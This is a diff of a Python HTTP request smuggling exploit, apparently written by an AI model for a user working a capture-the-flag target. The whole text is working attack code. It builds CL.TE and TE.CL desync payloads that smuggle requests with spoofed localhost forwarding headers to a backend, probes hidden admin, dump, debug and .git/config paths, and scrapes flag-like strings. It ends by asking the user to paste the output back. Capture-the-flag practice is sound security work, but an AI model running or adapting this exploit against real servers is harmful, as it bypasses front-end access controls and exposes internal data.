@@ -154,68 +154,110 @@ def detect(host):
 
 # candidate hidden/internal endpoints to try via the smuggled request
 CANDIDATES = [
-    "/?api=ledger", "/?api=orders", "/?api=admin", "/?api=roaster",
-    "/?api=books", "/?api=audit", "/?api=report", "/?api=afterhours",
-    "/?api=order&all=1", "/?api=order&list=1", "/ledger", "/roaster",
-    "/admin", "/internal", "/?api=ledger&after_hours=1",
+    # hidden API routes (internal-only?)
+    "/?api=ledger", "/?api=orders", "/?api=order&all=1", "/?api=order&list=1",
+    "/?api=admin", "/?api=roaster", "/?api=books", "/?api=daybook",
+    "/?api=audit", "/?api=report", "/?api=afterhours", "/?api=after-hours",
+    "/?api=ledger&after_hours=1", "/?api=eod", "/?api=closing", "/?api=night",
+    "/?api=all", "/?api=export", "/?api=dump", "/?api=debug",
+    # path-based (front may hide these; backend may serve)
+    "/ledger", "/roaster", "/admin", "/internal", "/books", "/daybook",
+    "/ledger.php", "/roaster.php", "/admin.php", "/after-hours",
+    # flag file (in case the <Files> deny is front-only / IP-conditional)
+    "/flag.txt", "/flag", "/README.md", "/.git/config",
 ]
 
-def smuggle_once(host, kind, smuggled_request_line, extra_headers):
-    """
-    Build a CL.TE or TE.CL smuggle. The smuggled request carries internal
-    headers (X-Forwarded-For/X-Real-IP = 127.0.0.1) to the BACKEND only.
-    Then we send a normal follow-up request on the same connection and read
-    what comes back (which may include the smuggled response).
-    """
-    smug = (f"{smuggled_request_line} HTTP/1.1\r\n"
+def split_responses(data):
+    """Split a byte stream into individual HTTP/1.x responses."""
+    txt = data.decode("latin1", "replace")
+    parts, idx = [], 0
+    while True:
+        nxt = txt.find("HTTP/1.", idx + 1)
+        if nxt == -1:
+            parts.append(txt[idx:]); break
+        parts.append(txt[idx:nxt]); idx = nxt
+    return [p for p in parts if p.startswith("HTTP/1.")]
+
+def build_smuggled(host, smuggled_request_line, te_line, extra_headers=""):
+    """The request Apache will parse as 'internal'. No body."""
+    return (f"{smuggled_request_line} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"X-Forwarded-For: 127.0.0.1\r\n"
             f"X-Real-IP: 127.0.0.1\r\n"
             f"X-Forwarded-Host: localhost\r\n"
+            f"X-Original-URL: {smuggled_request_line.split(' ',1)[-1]}\r\n"
             f"{extra_headers}"
-            f"Connection: keep-alive\r\n"
             f"Content-Length: 0\r\n\r\n")
+
+def smuggle_once(host, kind, smuggled_request_line, te_line="Transfer-Encoding: chunked"):
+    """
+    CL.TE: front uses Content-Length (forwards whole body), back uses chunked.
+    Body = '0\\r\\n\\r\\n' (empty chunked body => back ends request here) followed
+    by the smuggled request, which Apache then parses as the NEXT request.
+    We read both responses; the 2nd is the smuggled one.
+    """
+    smug = build_smuggled(host, smuggled_request_line, te_line)
     if kind == "CL.TE":
-        # front: CL (len of just the chunk framing); back: TE reads chunks then our smuggled req
-        chunk = f"{len(smug):x}\r\n{smug}\r\n0\r\n\r\n"
-        front_cl = len(chunk.split("\r\n", 1)[0]) + 2  # length of first chunk-size line
-        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
-                   f"Transfer-Encoding: chunked\r\n"
-                   f"Content-Length: {front_cl}\r\n"
-                   f"Connection: keep-alive\r\n\r\n{chunk}").encode()
-    else:  # TE.CL
-        # front: TE; back: CL. Body carries the smuggled request fully.
-        body = smug
-        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+        body = "0\r\n\r\n" + smug
+        payload = (f"POST / HTTP/1.1\r\n"
+                   f"Host: {host}\r\n"
+                   f"{te_line}\r\n"
                    f"Content-Length: {len(body)}\r\n"
-                   f"Transfer-Encoding: chunked\r\n"
                    f"Connection: keep-alive\r\n\r\n"
-                   f"{len(body):x}\r\n{body}\r\n0\r\n\r\n").encode()
+                   f"{body}").encode()
+    else:  # TE.CL : front uses chunked, back uses CL
+        # chunk contains the smuggled request; back's CL is small so it stops
+        # early and leaves the rest as the next request.
+        chunk_hdr = f"{len(smug):x}\r\n"
+        body = chunk_hdr + smug + "\r\n0\r\n\r\n"
+        payload = (f"POST / HTTP/1.1\r\n"
+                   f"Host: {host}\r\n"
+                   f"{te_line}\r\n"
+                   f"Content-Length: {len(chunk_hdr)}\r\n"
+                   f"Connection: keep-alive\r\n\r\n"
+                   f"{body}").encode()
     t, d, _ = send_recv(host, payload, read_timeout=8)
-    return d
+    return split_responses(d)
+
+import re
+def show(resps):
+    """Return (smuggled_response_text, interesting_bool)."""
+    if not resps:
+        return "(no response)", False
+    # response[0] = the POST / carrier (homepage); response[1+] = smuggled
+    smug = resps[1] if len(resps) > 1 else resps[0]
+    return smug, True
 
 def exploit(host, kind, only=None):
-    print(f"[*] Smuggling via {kind} against {host}")
+    print(f"[*] Smuggling via {kind} against {host}\n")
     targets = [only] if only else CANDIDATES
+    flags = set()
     for tgt in targets:
         try:
-            resp = smuggle_once(host, kind, "GET " + tgt, "")
-            txt = resp.decode("latin1", "replace")
-            # surface anything that looks like a flag or non-"Not found" JSON
-            interesting = any(k in txt for k in ("HI{", "hi{", "flag", "ledger", "token",
-                                                 '"ok"', "authorization", "Authorization"))
-            # strip to the last response on the connection (smuggled one often second)
-            marker = "  <<< INTERESTING" if interesting else ""
-            first = txt[:300].replace("\r", "")
-            print(f"\n=== smuggled GET {tgt} ==={marker}")
-            print(first)
-            if "HI{" in txt or "hi{" in txt:
-                import re
-                for m in re.findall(r"[A-Za-z0-9_]*\{[^}]{3,}\}", txt):
-                    print("  >>> POSSIBLE FLAG:", m)
+            resps = smuggle_once(host, kind, "GET " + tgt)
+            n = len(resps)
+            smug = resps[1] if n > 1 else (resps[0] if n else "")
+            status = smug.split("\r\n", 1)[0] if smug else "(none)"
+            # body preview
+            body = smug.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in smug else smug
+            body = body.strip()[:280].replace("\r", "")
+            interesting = any(k in smug for k in ("HI{", "hi{", "flag", "ledger",
+                               '"ok"', "token", "authorization", "Authorization", "roaster"))
+            mark = "  <<< INTERESTING" if interesting else ""
+            print(f"=== GET {tgt}  [{n} resp(s)]  smuggled-status: {status}{mark}")
+            if body:
+                print("    " + body.replace("\n", "\n    "))
+            for m in re.findall(r"[A-Za-z0-9_]{1,12}\{[^}]{3,120}\}", smug):
+                flags.add(m)
+            print()
         except Exception as e:
-            print(f"=== {tgt} === error: {e}")
+            print(f"=== {tgt} === error: {e}\n")
+    if flags:
+        print(">>> POSSIBLE FLAG(S):")
+        for f in flags: print("   ", f)
     print("\n[*] Done. Paste everything above back to me.")
+    print("[*] If every target shows only 1 response (the homepage) and no smuggled")
+    print("    status line, tell me — I'll adjust the chunk framing/offsets.")
 
 def main():
     if len(sys.argv) < 3:
